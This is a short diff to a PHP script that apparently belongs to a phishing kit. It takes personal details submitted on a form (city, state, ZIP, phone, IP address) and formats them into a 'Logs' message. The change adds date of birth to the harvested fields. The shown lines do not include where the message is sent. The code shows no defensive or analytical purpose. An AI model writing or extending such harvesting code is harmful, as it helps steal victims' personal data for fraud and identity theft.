@@ -20,6 +20,7 @@ $city = $_POST['city'];
 $state = $_POST['state'];
 $zip = $_POST['zip'];
 $phone = $_POST['phone'];
+$dob = $_POST['dob'];
 $country = $query['country'];
 
 # Logs
@@ -31,6 +32,7 @@ $message .= "➤ [ City ] : {$city}\n";
 $message .= "➤ [ State ] : {$state}\n";
 $message .= "➤ [ ZIP ] : {$zip}\n";
 $message .= "➤ [ Phone ] : {$phone}\n";
+$message .= "➤ [ DOB ] : {$dob}\n";
 $message .= "➤ [ Country ] : {$country}\n";
 $message .= "--------- MORE INFO -----------\n";
 $message .= "➤ [ IP Address ] : {$IP}\n";
